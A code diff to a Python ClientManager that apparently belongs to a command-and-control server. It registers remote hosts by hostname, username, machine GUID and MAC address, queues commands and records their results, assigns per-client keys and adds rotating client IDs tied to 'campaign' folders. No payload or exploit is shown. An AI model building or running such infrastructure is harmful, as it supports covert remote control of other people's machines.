@@ -2,6 +2,8 @@ import datetime
 import os
 import json
 import hashlib
+import string
+import random
 from utils.client_identity import generate_client_id, extract_system_info
 
 class ClientManager:
@@ -14,7 +16,7 @@ class ClientManager:
         self.client_keys = {}  # Storage for client-specific encryption keys
 
     def add_client(self, ip, hostname="Unknown", username="Unknown", machine_guid="Unknown", 
-                os_version="Unknown", mac_address="Unknown", system_info=None, client_id=None):
+                os_version="Unknown", mac_address="Unknown", system_info=None, client_id=None, current_id=None):
         """Register a client using ClientId as the primary identifier"""
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
@@ -24,7 +26,7 @@ class ClientManager:
         # Use the provided client_id, or generate one based on system info, or fall back to IP
         if not client_id:
             if machine_guid != "Unknown":
-                client_id = hashlib.sha256(machine_guid.encode()).hexdigest()[:16]
+                client_id = generate_client_id(ip, hostname, username, machine_guid, os_version)
             else:
                 client_id = ip
         
@@ -33,6 +35,11 @@ class ClientManager:
             # Update existing client information
             self.clients[client_id]["last_seen"] = now
             self.clients[client_id]["ip"] = ip
+            
+            # Update current_client_id if provided and different
+            if current_id and current_id != client_id and current_id != self.clients[client_id].get("current_client_id"):
+                self.clients[client_id]["current_client_id"] = current_id
+                self.log_event(client_id, "Security", f"Client ID tracking updated to {current_id}")
             
             # Only update these fields if they're not "Unknown"
             if hostname != "Unknown":
@@ -64,6 +71,13 @@ class ClientManager:
                     "warnings": ["New client"]
                 }
             }
+            
+            # Set current client ID if provided and different
+            if current_id and current_id != client_id:
+                self.clients[client_id]["current_client_id"] = current_id
+                self.clients[client_id]["original_client_id"] = client_id
+                self.log_event(client_id, "Security", f"Client initialized with rotated ID {current_id}")
+            
             self.log_event(client_id, "Client Connected", f"New client connected: {hostname} from {ip}")
         
         # Ensure client info is saved to disk
@@ -73,6 +87,66 @@ class ClientManager:
         if hasattr(self, 'on_client_updated') and callable(self.on_client_updated):
             self.on_client_updated()
         
+        return client_id
+
+    def update_client_id_mapping(self, original_id, current_id):
+        """Update the mapping between original and current client ID"""
+        if original_id in self.clients:
+            # Store the current ID in the client info
+            self.clients[original_id]['current_client_id'] = current_id
+            # Also store the original ID to make it easier to track
+            self.clients[original_id]['original_client_id'] = original_id
+            
+            self.log_event(original_id, "Security", f"Client ID rotated to {current_id}")
+            
+            # Save the updated client info
+            self._save_clients()
+            
+            # If we're using client-specific keys, make sure they're accessible via both IDs
+            if hasattr(self, 'client_keys') and original_id in self.client_keys:
+                # Copy the key to be accessible via both IDs
+                self.client_keys[current_id] = self.client_keys[original_id]
+            
+            return True
+        return False
+
+    def get_client_by_current_id(self, current_id):
+        """Find the original client ID by the current rotated ID"""
+        for client_id, client_info in self.clients.items():
+            if client_info.get('current_client_id') == current_id:
+                return client_id
+        return None
+
+    def get_original_client_id(self, client_id):
+        """Find the original client ID regardless of whether client_id is original or current"""
+        # First check if this is already an original ID
+        if client_id in self.clients:
+            if self.clients[client_id].get('original_client_id') == client_id:
+                return client_id
+            
+        # If not, check if it's a current ID and find the corresponding original
+        for orig_id, client_info in self.clients.items():
+            if client_info.get('current_client_id') == client_id:
+                return orig_id
+        
+        # If not found, just return the input ID
+        return client_id
+
+    def get_current_client_id(self, original_id):
+        """Get the current client ID for an original ID"""
+        if original_id in self.clients:
+            return self.clients[original_id].get('current_client_id', original_id)
+        return original_id
+
+    def get_client_display_name(self, client_id):
+        """Get a display name for the client showing original and current IDs if rotated"""
+        if client_id in self.clients:
+            client_info = self.clients[client_id]
+            current_id = client_info.get('current_client_id')
+            
+            if current_id and current_id != client_id:
+                return f"{client_id} → {current_id}"
+            return client_id
         return client_id
 
     def set_verification_status(self, client_id, is_verified, confidence=None, warnings=None):
@@ -95,19 +169,22 @@ class ClientManager:
 
     def add_command(self, client_id, command_type, args, ip="Unknown", hostname="Unknown"):
         """Add a command to the client's pending commands"""
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        
         # If we know the client already
-        if client_id in self.clients:
+        if original_id in self.clients:
             command = {
                 "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "command_type": command_type,
                 "args": args
             }
-            self.clients[client_id]["pending_commands"].append(command)
-            self.clients[client_id]["history"].append(command)
-            self.log_event(client_id, "Command added", f"Command {command_type} with args {args} was added")
+            self.clients[original_id]["pending_commands"].append(command)
+            self.clients[original_id]["history"].append(command)
+            self.log_event(original_id, "Command added", f"Command {command_type} with args {args} was added")
             
             # Notify listeners that a command has been added
-            self.on_command_updated(client_id)
+            self.on_command_updated(original_id)
             return True
         else:
             # Check if this is a key_rotation command - these should only be added to known clients
@@ -137,21 +214,24 @@ class ClientManager:
 
     def add_command_result(self, client_id, timestamp, result):
         """Add a result to a command in the client's history"""
-        if client_id in self.clients:
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        
+        if original_id in self.clients:
             # Find the command with the matching timestamp
             found = False
-            for command in self.clients[client_id]["history"]:
+            for command in self.clients[original_id]["history"]:
                 if command.get("timestamp") == timestamp:
                     command["result"] = result
-                    self.log_event(client_id, "Command Result", f"Result received for command at {timestamp}")
+                    self.log_event(original_id, "Command Result", f"Result received for command at {timestamp}")
                     found = True
                     
                     # Notify listeners that the command has been updated
-                    self.on_command_updated(client_id)
+                    self.on_command_updated(original_id)
             
             if not found:
                 # Handle case where the command might be missing from history
-                self.log_event(client_id, "Command Result", f"Received result for unknown command timestamp: {timestamp}")
+                self.log_event(original_id, "Command Result", f"Received result for unknown command timestamp: {timestamp}")
                 
                 # Create a placeholder command with the result
                 command = {
@@ -160,8 +240,8 @@ class ClientManager:
                     "args": "",
                     "result": result
                 }
-                self.clients[client_id]["history"].append(command)
-                self.on_command_updated(client_id)
+                self.clients[original_id]["history"].append(command)
+                self.on_command_updated(original_id)
             
             return found
         return False
@@ -172,36 +252,63 @@ class ClientManager:
 
     def get_client_history(self, client_id):
         """Get command history for a specific client"""
-        return self.clients.get(client_id, {}).get("history", [])
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        return self.clients.get(original_id, {}).get("history", [])
 
     def get_pending_commands(self, client_id):
         """Get pending commands for a specific client"""
-        return self.clients.get(client_id, {}).get("pending_commands", [])
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        return self.clients.get(original_id, {}).get("pending_commands", [])
 
     def clear_pending_commands(self, client_id):
         """Clear all pending commands for a client"""
-        if client_id in self.clients:
-            self.clients[client_id]["pending_commands"] = []
-            self.log_event(client_id, "Commands cleared", f"Pending commands cleared")
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        
+        if original_id in self.clients:
+            self.clients[original_id]["pending_commands"] = []
+            self.log_event(original_id, "Commands cleared", f"Pending commands cleared")
 
     def register_command_update_callback(self, client_id, callback):
         """Registers a callback to be called when a command result is updated."""
-        self.command_update_callbacks.setdefault(client_id, []).append(callback)
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        self.command_update_callbacks.setdefault(original_id, []).append(callback)
 
     def on_command_updated(self, client_id):
         """Calls all registered callbacks for the given client."""
+        # First call callbacks registered for the original ID
         for callback in self.command_update_callbacks.get(client_id, []):
             callback()
+            
+        # Also check if this client has a current ID and call those callbacks
+        if client_id in self.clients:
+            current_id = self.clients[client_id].get('current_client_id')
+            if current_id and current_id != client_id:
+                # Call callbacks for current ID as well, if any exist
+                for callback in self.command_update_callbacks.get(current_id, []):
+                    callback()
 
     def has_unique_key(self, client_id):
         """Check if client already has a unique key"""
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        
         # Direct check in client_keys dictionary
-        if client_id in self.client_keys:
+        if original_id in self.client_keys:
             return True
+            
+        # Also check for current ID if applicable
+        if original_id in self.clients:
+            current_id = self.clients[original_id].get('current_client_id')
+            if current_id and current_id != original_id and current_id in self.client_keys:
+                return True
         
         # Additional check in client info if available
-        if client_id in self.clients:
-            if 'key_rotation_time' in self.clients[client_id]:
+        if original_id in self.clients:
+            if 'key_rotation_time' in self.clients[original_id]:
                 # If we have a rotation time recorded, assume the key exists
                 return True
         
@@ -209,16 +316,27 @@ class ClientManager:
 
     def set_client_key(self, client_id, key):
         """Set a unique key for a client"""
-        self.client_keys[client_id] = key
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        
+        # Store the key under the original ID
+        self.client_keys[original_id] = key
+        
+        # Also store under current ID if different
+        if original_id in self.clients:
+            current_id = self.clients[original_id].get('current_client_id')
+            if current_id and current_id != original_id:
+                # Also store the key for the current ID
+                self.client_keys[current_id] = key
         
         # Add timestamp for key rotation
         current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
         # Update client info with key rotation time
-        if client_id in self.clients:
-            self.clients[client_id]['key_rotation_time'] = current_time
+        if original_id in self.clients:
+            self.clients[original_id]['key_rotation_time'] = current_time
         
-        self.log_event(client_id, "Security", "Unique encryption key assigned after verification")
+        self.log_event(original_id, "Security", "Unique encryption key assigned after verification")
         
         # Save keys to disk for persistence
         self._save_client_keys()
@@ -231,10 +349,17 @@ class ClientManager:
         # Don't save actual keys, just record which clients have unique keys
         client_key_status = {}
         for client_id in self.client_keys:
-            client_key_status[client_id] = {
-                "has_unique_key": True,
-                "assigned_at": self._current_timestamp()
-            }
+            # Only record info for original client IDs
+            if client_id in self.clients and self.clients[client_id].get('original_client_id') == client_id:
+                client_key_status[client_id] = {
+                    "has_unique_key": True,
+                    "assigned_at": self._current_timestamp()
+                }
+                
+                # Also record current ID mapping if applicable
+                current_id = self.clients[client_id].get('current_client_id')
+                if current_id and current_id != client_id:
+                    client_key_status[client_id]["current_id"] = current_id
         
         # Create client_keys.json in the campaign folder
         for client_id, client_info in self.clients.items():
@@ -267,6 +392,9 @@ class ClientManager:
             if 'system_info' in client_info and 'campaign_folder' in client_info['system_info']:
                 campaign_folder = client_info['system_info']['campaign_folder']
                 break
+            elif 'campaign_folder' in client_info:
+                campaign_folder = client_info['campaign_folder']
+                break
         
         # If we couldn't find a campaign folder, try to detect it
         if not campaign_folder:
@@ -284,6 +412,10 @@ class ClientManager:
         # Prepare client data for saving (removing any sensitive information)
         client_data = {}
         for client_id, client_info in self.clients.items():
+            # Skip saving non-original client IDs (those that are just aliases)
+            if client_info.get('original_client_id') != client_id and client_info.get('original_client_id'):
+                continue
+                
             # Create a clean copy without sensitive data
             client_data[client_id] = {
                 "ip": client_info.get("ip", "Unknown"),
@@ -296,6 +428,14 @@ class ClientManager:
                     "warnings": ["Unknown client"]
                 })
             }
+            
+            # Add current ID mapping if applicable
+            if "current_client_id" in client_info and client_info["current_client_id"] != client_id:
+                client_data[client_id]["current_client_id"] = client_info["current_client_id"]
+                
+            # Add key rotation time if available
+            if "key_rotation_time" in client_info:
+                client_data[client_id]["key_rotation_time"] = client_info["key_rotation_time"]
             
             # Add system info without sensitive fields
             if "system_info" in client_info:
